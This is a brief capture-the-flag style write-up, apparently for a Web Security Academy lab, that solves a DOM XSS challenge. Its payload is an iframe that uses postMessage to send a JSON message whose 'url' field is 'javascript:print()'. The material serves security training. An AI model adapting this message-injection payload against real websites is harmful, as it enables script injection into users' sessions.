# DOM XSS using web messages and JSON.parse

![image](https://user-images.githubusercontent.com/60841283/153748114-09006135-d5fa-4fd7-9723-db0195328481.png)

Payload in exploit server (in Body section) :- 
```html
<iframe src="https://aced1f861f364f39c07a349c00ab0011.web-security-academy.net/#" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'></iframe>
```

![image](https://user-images.githubusercontent.com/60841283/153748070-22690cd2-b548-4f56-846c-bbc20163f2c1.png)
